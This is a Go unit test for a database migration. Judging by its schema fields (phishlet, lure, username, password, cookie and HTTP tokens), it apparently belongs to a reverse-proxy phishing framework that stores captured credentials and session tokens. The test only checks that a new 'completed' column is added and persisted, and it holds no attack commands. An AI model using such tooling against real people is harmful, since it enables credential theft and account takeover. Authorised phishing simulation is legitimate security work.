package database

import (
	"database/sql"
	"path/filepath"
	"testing"
)

const legacySchema = `CREATE TABLE sessions (
	id INTEGER PRIMARY KEY AUTOINCREMENT,
	session_id TEXT NOT NULL UNIQUE,
	phishlet TEXT NOT NULL DEFAULT '',
	lure_id TEXT NOT NULL DEFAULT '',
	landing_url TEXT NOT NULL DEFAULT '',
	username TEXT NOT NULL DEFAULT '',
	password TEXT NOT NULL DEFAULT '',
	custom TEXT NOT NULL DEFAULT '{}',
	body_tokens TEXT NOT NULL DEFAULT '{}',
	http_tokens TEXT NOT NULL DEFAULT '{}',
	cookie_tokens TEXT NOT NULL DEFAULT '{}',
	useragent TEXT NOT NULL DEFAULT '',
	remote_addr TEXT NOT NULL DEFAULT '',
	create_time INTEGER NOT NULL DEFAULT 0,
	update_time INTEGER NOT NULL DEFAULT 0
)`

func TestLegacyDatabaseGetsCompletionColumn(t *testing.T) {
	path := filepath.Join(t.TempDir(), "legacy.db")
	raw, err := sql.Open("sqlite", path)
	if err != nil {
		t.Fatalf("open raw: %v", err)
	}
	if _, err := raw.Exec(legacySchema); err != nil {
		t.Fatalf("legacy schema: %v", err)
	}
	if _, err := raw.Exec("INSERT INTO sessions (session_id, phishlet) VALUES ('s1', 'edds')"); err != nil {
		t.Fatalf("legacy row: %v", err)
	}
	raw.Close()

	db, err := NewDatabase(path)
	if err != nil {
		t.Fatalf("migrate: %v", err)
	}
	defer db.Close()

	s, err := db.GetSessionById(1)
	if err != nil {
		t.Fatalf("get: %v", err)
	}
	if s.Completed {
		t.Fatal("legacy row must default to not completed")
	}
	if err := db.SetSessionDone("s1"); err != nil {
		t.Fatalf("set done: %v", err)
	}
	s, err = db.GetSessionById(1)
	if err != nil {
		t.Fatalf("get after done: %v", err)
	}
	if !s.Completed {
		t.Fatal("completed was not persisted")
	}
}
